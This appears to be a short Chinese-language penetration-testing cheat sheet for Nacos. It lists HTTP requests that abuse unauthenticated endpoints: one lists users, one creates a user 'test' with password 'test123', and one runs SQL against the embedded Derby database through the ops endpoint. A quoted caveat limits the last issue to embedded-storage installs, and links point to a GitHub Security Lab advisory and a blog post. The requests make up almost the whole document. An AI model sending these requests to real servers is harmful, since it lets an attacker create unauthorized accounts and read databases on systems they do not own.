### 查看用户
```
GET /nacos/v1/auth/users?pageNo=1&pageSize=100
```

### 创建用户
```
POST /nacos/v1/auth/users?username=test&password=test123
```

### unauth
```
/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st
```

> These endpoints are only valid when using embedded storage (derby DB) so this issue should not affect those installations using external storage (e.g. mysql)

- https://securitylab.github.com/advisories/GHSL-2020-325_326-nacos/
- https://www.cnblogs.com/hack404/p/14697313.html
